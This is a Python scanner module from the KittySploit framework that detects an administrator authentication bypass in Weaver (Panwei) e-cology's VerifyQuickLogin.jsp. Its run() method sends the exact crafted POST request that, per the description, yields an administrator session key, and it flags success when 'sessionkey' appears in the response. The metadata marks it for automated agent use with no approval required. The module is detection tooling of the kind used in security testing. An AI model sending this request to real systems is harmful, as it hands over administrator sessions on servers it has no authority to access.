#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary administrator login vulnerability in the Panwei OA E-Cology VerifyQuickLogin."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Weaver e-cology verifyquicklogin.jsp - Auth Bypass Detection',
        'description': 'There is an arbitrary administrator login vulnerability in the Panwei OA E-Cology VerifyQuickLogin.jsp file. An attacker can obtain the administrator Session by sending a special request package.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'ecology', 'weaver', 'oa', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html',
        ],
    }

    def run(self):
        path = '/mobile/plugin/VerifyQuickLogin.jsp'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='identifier=1&language=1&ipaddress=x.x.x.x\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"sessionkey":', '"message":',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Weaver e-cology verifyquicklogin.jsp - Auth Bypass detected', path=path)
            return True
        return False

